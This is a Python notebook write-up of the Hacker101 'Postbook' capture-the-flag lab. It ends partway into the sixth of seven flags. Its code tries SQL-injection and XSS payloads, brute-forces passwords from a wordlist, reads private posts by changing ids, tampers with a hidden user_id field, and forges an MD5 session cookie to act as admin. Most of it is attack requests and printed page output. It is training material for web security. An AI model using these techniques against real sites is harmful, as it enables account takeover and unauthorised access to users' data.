# %% [markdown]
# # Postbook - Captured flags 7/7

# %%
import requests, time

url = "https://fe9f28ab34bfa6204476535092dabb10.ctf.hacker101.com/" # Home page

session = requests.Session()

# %% [markdown]
# ## 1° Flag caught

# %%
# Get the home page
response = session.get(url)
print(response.text)

# %% [markdown]
# Home page:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=sign_in.php">Sign in</a>
#         <a href="index.php?page=sign_up.php">Sign up</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Welcome!</h2>
#
# <p>
#   With this amazing tool you can write and publish your own posts. It'll
#   allow you to write public and private posts. Public posts can be read by
#   anyone that signs up. Private posts can only be read by you. See it as your
#   own diary. We'll make sure that your private posts are safe with us.
# </p>
#
# <h2>Post timeline</h2>
#
# <a href="index.php?page=sign_up.php">Sign up</a>
# <br />
# <a href="index.php?page=sign_in.php">Sign in</a>
#     </div>
#   </body>
# </html>
# ```

# %%
# Try tge sign up page
response = session.get(url + "?page=sign_up.php")
print(response.text)

# %% [markdown]
# Sign-up page:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=sign_in.php">Sign in</a>
#         <a href="index.php?page=sign_up.php">Sign up</a>
#
#     </div>
#
#     <div id="container">
#         <form method="post" action="index.php?page=sign_up.php">
#     <h2>Sign up</h2>
#     <p>
#       Please <strong>only</strong> use fake and temporary credentials. All
#       of the information stored is this system is considered to be open to
#       everyone.
#     </p>
#
#     <p>
#       <strong>Usernames should be lowercase characters only.</strong>
#     </p>
#
#     <script>
#       function validate() {
#         var username = document.getElementById('username');
#         var submit = document.getElementById('submit');
#
#         if(/^[a-z]+$/.test(username.value)) {
#           submit.disabled = false;
#         } else {
#           submit.disabled = true;
#         }
#       }
#     </script>
#
#     <input type="text" id="username" placeholder="Username" onkeyup="validate()" name="username" />
#     <br />
#     <input type="password" placeholder="Password" onkeyup="validate()" name="password" />
#     <br />
#     <input type="submit" id="submit" disabled="disabled" name="submit" />
#   </form>
#       </div>
#   </body>
# </html>
# ```

# %%
# Get the sign in page
response = session.get(url + "?page=sign_in.php")
print(response.text)

# %% [markdown]
# Sign in page:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=sign_in.php">Sign in</a>
#         <a href="index.php?page=sign_up.php">Sign up</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Sign in</h2>
#
# <form method="post" action="index.php?page=sign_in.php">
#     <input type="text" placeholder="Username" name="username" />
#   <br />
#   <input type="password" placeholder="Password" name="password" />
#   <br />
#   <input type="submit" />
# </form>
#     </div>
#   </body>
# </html>
# ```

# %% [markdown]
# Try **SQL Injection** with the sign in page

# %%
response = session.post(url + "?page=sign_in.php", data={"username": "' or 1=1;--", "password": "' or 1=1;--"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)

# %% [markdown]
# Response:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=sign_in.php">Sign in</a>
#         <a href="index.php?page=sign_up.php">Sign up</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Sign in</h2>
#
#     <p>
#       You've entered a wrong username/password combination. Please do not
#       hack our system because it is insanely illegal. We will report you to
#       PETA if you continue. Nothing is logged, but we ask you kindly not to
#       try anything malicious.
#     </p>
#
#     <p>
#       <a href="index.php?page=sign_in.php">Go back</a>
#     </p>
#         </div>
#   </body>
# </html>
# ```
#
# It didn't work... Now, I try to sign up with new credentials and see which additional priviledged actions I can do.

# %%
response = session.post(url + "?page=sign_up.php", data={"username": "admin", "password": "admin"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
response = session.post(url + "?page=sign_in.php", data={"username": "admin", "password": "admin"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)
print(response.cookies)

# %% [markdown]
# Logged-in home page:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=d">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Welcome!</h2>
#
# <p>
#   With this amazing tool you can write and publish your own posts. It'll
#   allow you to write public and private posts. Public posts can be read by
#   anyone that signs up. Private posts can only be read by you. See it as your
#   own diary. We'll make sure that your private posts are safe with us.
# </p>
#
# <h2>Post timeline</h2>
#
#   <div class="post">
#     <form method="post" action="index.php?page=create.php">
#       <textarea name="body" style="width: 100%; height: 25px;" placeholder="What's on your mind?" class="inline" required></textarea>
#       <br /><br />
#       <input type="checkbox" name="private" />For my own eyes only
#       <input type="hidden" name="return" value="home" />
#       <input type="hidden" name="user_id" value="3" />
#       <input type="submit" value="Create post" style="float: right;" />
#     </form>
#   </div>
#
#   <div class="post"><a href="index.php?page=view.php&id=3">Hello everyone!</a><br />This is my first post as a user on Postbook!<br /><span style="color: #666">Author: user</span></div><div class="post"><a href="index.php?page=view.php&id=1">Hello world</a><br />This is the first post!<br /><span style="color: #666">Author: admin</span></div>    </div>
#   </body>
# </html>
# ```
#
# No cookies stored after the correct login. I immediately noticed that the two posts already stored into the website are related to the ids 1 and 3... Let's go requesting the id 2.

# %%
response = session.get(url + "index.php?page=view.php&id=2")
print(response.text)

# %% [markdown]
# Response:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=d">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <div class="post">^FLAG^...$FLAG$</div><div class="post"><span style="color: red;">SECRET:</span> <a href="index.php?page=view.php&id=2">Dear diary...</a><br />I am so glad that I am on Postbook. I can finally write down my thoughts and no one can see them. See you tomorrow. Yours truly, admin<br /><span style="color: #666">Author: admin</span></div>    </div>
#   </body>
# </html>
# ```
#
# First flag found! Let's go hunting the next one!

# %% [markdown]
# ## 2° Flag caught

# %% [markdown]
# This is the part of the user home page where the user can submit new posts:
# ```html
# <div class="post">
# <form method="post" action="index.php?page=create.php">
# 	<textarea name="body" style="width: 100%; height: 25px;" placeholder="What's on your mind?" class="inline" required></textarea>
# 	<br /><br />
# 	<input type="checkbox" name="private" />For my own eyes only
# 	<input type="hidden" name="return" value="home" />
# 	<input type="hidden" name="user_id" value="3" />
# 	<input type="submit" value="Create post" style="float: right;" />
# </form>
# </div>
# ```
#
# I want to try it and I want to play with the user_id value...

# %%
response = session.post(url + "?page=create.php", data={"body": "<script>alert(1);</script>", "private": "0", "user_id": "3", "return": "home"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)
# The attack did not work, the script tag was escaped

response = session.post(url + "?page=create.php", data={"body": '<button onclick="alert(1);">a</button>', "private": "0", "user_id": "3", "return": "home"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)
# All the tags are escaped

# %%
# Get the "Write a new post" page

response = session.get(url + "?page=create.php")
print(response.text)

# %% [markdown]
# Write a new post page:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=d">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#
# <h2>New post</h2>
#
# <form method="post" action="index.php?page=create.php">
#   Title:<br />
#   <input type="text" name="title" style="width: 250px;" required />
#   <br />
#   Post:<br/ >
#   <textarea name="body" style="width: 250px; height: 250px;" required></textarea>
#   <br /><br />
#   <input type="checkbox" name="private" />Yes, this is for my own eyes only!
#   <input type="hidden" name="user_id" value="3" />
#   <br />
#   <input type="submit" value="Create post" />
# </form>
#     </div>
#   </body>
# </html>
# ```
#
# I want to try to exploit the title...

# %%
response = session.post(url + "?page=create.php", data={"body": "<script>alert(1);</script>", "title": "<script>alert(1);</script>", "private": "0", "user_id": "3"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)
# The attack did not work, the script tag was escaped

# %% [markdown]
# I want to try to bruteforce the user account's password...

# %%
with open("psw.txt") as f:
	psws = f.readlines()

for user in ["user", "admin"]:
	for psw in psws:
		psw = psw.strip()
		response = session.post(url + "?page=sign_in.php", data={"username": user, "password": psw}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
		if "wrong username/password combination" not in response.text:
			print(user, psw)
			break
			
		time.sleep(0.3)

# %% [markdown]
# The password associated with the username ```user``` is ```password```.

# %%
response = session.post(url + "index.php?page=sign_in.php", data={"username": "user", "password": "password"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)

# %% [markdown]
# User's home page:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=c">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Welcome!</h2>
#
# <p>
#   With this amazing tool you can write and publish your own posts. It'll
#   allow you to write public and private posts. Public posts can be read by
#   anyone that signs up. Private posts can only be read by you. See it as your
#   own diary. We'll make sure that your private posts are safe with us.
# </p>
#
# <h2>Post timeline</h2>
#
# ^FLAG^...$FLAG$  <div class="post">
#     <form method="post" action="index.php?page=create.php">
#       <textarea name="body" style="width: 100%; height: 25px;" placeholder="What's on your mind?" class="inline" required></textarea>
#       <br /><br />
#       <input type="checkbox" name="private" />For my own eyes only
#       <input type="hidden" name="return" value="home" />
#       <input type="hidden" name="user_id" value="2" />
#       <input type="submit" value="Create post" style="float: right;" />
#     </form>
#   </div>
#
#   <div class="post"><a href="index.php?page=view.php&id=3">Hello everyone!</a><br />This is my first post as a user on Postbook!<br /><span style="color: #666">Author: user</span><div style="float: right;"><a href="index.php?page=edit.php&id=3">edit</a> <a style="color: red;" href="index.php?page=delete.php&id=eccbc87e4b5ce2fe28308fd9f2a7baf3">delete</a></div></div><div class="post"><a href="index.php?page=view.php&id=1">Hello world</a><br />This is the first post!<br /><span style="color: #666">Author: admin</span></div>    </div>
#   </body>
# </html>
# ```
#
# Second flag found!

# %% [markdown]
# ## 3° Flag caught

# %% [markdown]
# I try to edit a non-existing post...

# %%
response = session.get(url + "index.php?page=edit.php&id=1")
print(response.text)

response = session.post(url + "?page=edit.php&id=1000", data={"body": "<script>alert(1);</script>", "title": "<script>alert(1);</script>", "private": "0"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)

# %% [markdown]
# Responses:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=c">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#
# <h2>Edit post</h2>
#
# <form method="post" action="index.php?page=edit.php&id=1">
#   Title:<br />
#   <input type="text" name="title" value="Hello world" style="width: 250px;" />
#   <br />
#   Post:<br/ >
#   <textarea name="body" style="width: 250px; height: 250px;" required>This is the first post!</textarea>
#   <br /><br />
#   <input type="checkbox" name="private" />Yes, this is my own eyes only!
#   <br />
#   <input type="submit" value="Save post" />
# </form>
#     </div>
#   </body>
# </html>
# ```
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=c">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <span style="background-color: green; padding: 3px;">Your post was created. See it below!</span><br /><br /><span style="background-color: yellow; padding: 3px;">^FLAG^...$FLAG$</span><br /><br /><h1>Post not found</h1>    </div>
#   </body>
# </html>
# ```
#
# Flag found!

# %% [markdown]
# ## 4° Flag caught

# %% [markdown]
# I saw from the user's home page that there is the possibility of deleting posts. The html part of the page is:
# ```html
# <a style="color: red;" href="index.php?page=delete.php&id=eccbc87e4b5ce2fe28308fd9f2a7baf3">delete</a>
# ```
# The id of that post is 3 and, by computing various digests using different hash functions, I discovered that the related digest included in the url is the output of the MD5 hash function... Consequently, I want to try to delete the post of the user admin, that is associated with id 1.

# %%
response = session.get(url + "index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b")
print(response.text)

# %% [markdown]
# Response:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=c">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Welcome!</h2>
#
# <p>
#   With this amazing tool you can write and publish your own posts. It'll
#   allow you to write public and private posts. Public posts can be read by
#   anyone that signs up. Private posts can only be read by you. See it as your
#   own diary. We'll make sure that your private posts are safe with us.
# </p>
#
# <h2>Post timeline</h2>
#
# <span style="background-color: yellow; padding: 3px;">^FLAG^...$FLAG$</span><br /><br />^FLAG^...$FLAG$  <div class="post">
#     <form method="post" action="index.php?page=create.php">
#       <textarea name="body" style="width: 100%; height: 25px;" placeholder="What's on your mind?" class="inline" required></textarea>
#       <br /><br />
#       <input type="checkbox" name="private" />For my own eyes only
#       <input type="hidden" name="return" value="home" />
#       <input type="hidden" name="user_id" value="2" />
#       <input type="submit" value="Create post" style="float: right;" />
#     </form>
#   </div>
#
#   <div class="post"><a href="index.php?page=view.php&id=3">Hello everyone!</a><br />This is my first post as a user on Postbook!<br /><span style="color: #666">Author: user</span><div style="float: right;"><a href="index.php?page=edit.php&id=3">edit</a> <a style="color: red;" href="index.php?page=delete.php&id=eccbc87e4b5ce2fe28308fd9f2a7baf3">delete</a></div></div>    </div>
#   </body>
# </html>
# ```
#
# Forth flag found!

# %% [markdown]
# ## 5° Flag

# %% [markdown]
# From the home page of the user I can see that there is a form used to post things that has an hidden parameter called ```user_id```. I try to change that value so that the post will be associated to a different user.

# %%
response = session.post(url + "?page=create.php", data={"body": "admin post", "private": "0", "user_id": "1", "return": "home"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(response.text)

# %% [markdown]
# Response:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=c">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Welcome!</h2>
#
# <p>
#   With this amazing tool you can write and publish your own posts. It'll
#   allow you to write public and private posts. Public posts can be read by
#   anyone that signs up. Private posts can only be read by you. See it as your
#   own diary. We'll make sure that your private posts are safe with us.
# </p>
#
# <h2>Post timeline</h2>
#
# <span style="background-color: yellow; padding: 3px;">^FLAG^...$FLAG$</span><br /><br />^FLAG^...$FLAG$  <div class="post">
#     <form method="post" action="index.php?page=create.php">
#       <textarea name="body" style="width: 100%; height: 25px;" placeholder="What's on your mind?" class="inline" required></textarea>
#       <br /><br />
#       <input type="checkbox" name="private" />For my own eyes only
#       <input type="hidden" name="return" value="home" />
#       <input type="hidden" name="user_id" value="2" />
#       <input type="submit" value="Create post" style="float: right;" />
#     </form>
#   </div>
#
#   <div class="post"><a href="index.php?page=view.php&id=4"></a><br />admin post<br /><span style="color: #666">Author: admin</span></div><div class="post"><a href="index.php?page=view.php&id=3">Hello everyone!</a><br />This is my first post as a user on Postbook!<br /><span style="color: #666">Author: user</span><div style="float: right;"><a href="index.php?page=edit.php&id=3">edit</a> <a style="color: red;" href="index.php?page=delete.php&id=eccbc87e4b5ce2fe28308fd9f2a7baf3">delete</a></div></div><div class="post"><a href="index.php?page=view.php&id=1">Hello world</a><br />This is the first post!<br /><span style="color: #666">Author: admin</span></div>    </div>
#   </body>
# </html>
# ```
#
# Boom! Fifth flag found!

# %% [markdown]
# ## 6° Flag caught

# %% [markdown]
# I have just discovered how to see cookies stored in a session object...

# %%
response = session.post(url + "index.php?page=sign_in.php", data={"username": "user", "password": "password"}, headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})
print(session.cookies.get_dict())

# %% [markdown]
# Response:
# ```python
# {'id': 'eccbc87e4b5ce2fe28308fd9f2a7baf3'}
# ```
#
# I found the session cookies... Now I would like to replace it to authenticate as Admin... The value ```eccbc87e4b5ce2fe28308fd9f2a7baf3``` seems to be a MD5 digest... I took advantage of this website to discover the related plaintext: ```https://crackstation.net/```. The discovered plaintext is 2... So, if I replace it with the MD5's digest of 1, I should be able to access the webiste as Admin...

# %%
response = requests.get(url + "index.php", headers={"Content-Type": "application/x-www-form-urlencoded", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'}, cookies={"id": "c4ca4238a0b923820dcc509a6f75849b"})
print(response.text)

# %% [markdown]
# Response:
# ```html
# <html>
#   <head>
#     <title>Postbook</title>
#     <style type="text/css">
#       a {
#         color: blue;
#       }
#
#       html, body {
#         margin: 0;
#         padding: 0;
#         background: #edf0f5;
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       input, textarea {
#         font-family: Helvetica, Arial, sans-serif;
#         font-size: 15pt;
#       }
#
#       div#top {
#         background-color: #3b5998;
#         padding: 10px;
#         color: white;
#       }
#
#       div#top a {
#         color: white;
#       }
#
#       div#container {
#         padding: 10px;
#       }
#
#       div.post {
#         background-color: white;
#         width: 500px;
#         padding: 20px;
#         margin-bottom: 10px;
#         border: 1px solid #eee;
#         border-radius: 5px;
#       }
#
#       textarea.inline {
#         border: 0;
#       }
#     </style>
#   </head>
#   <body>
#     <div id="top">
#       <h1>Postbook</h1>
#
#       <a href="index.php">Home</a>
#               <a href="index.php?page=create.php">Write a new post</a>
#         <a href="index.php?page=profile.php&id=b">My profile</a>
#         <a href="index.php?page=account.php">Settings</a>
#         <a href="index.php?page=sign_out.php">Sign out</a>
#
#     </div>
#
#     <div id="container">
#       <h2>Welcome!</h2>
#
# <p>
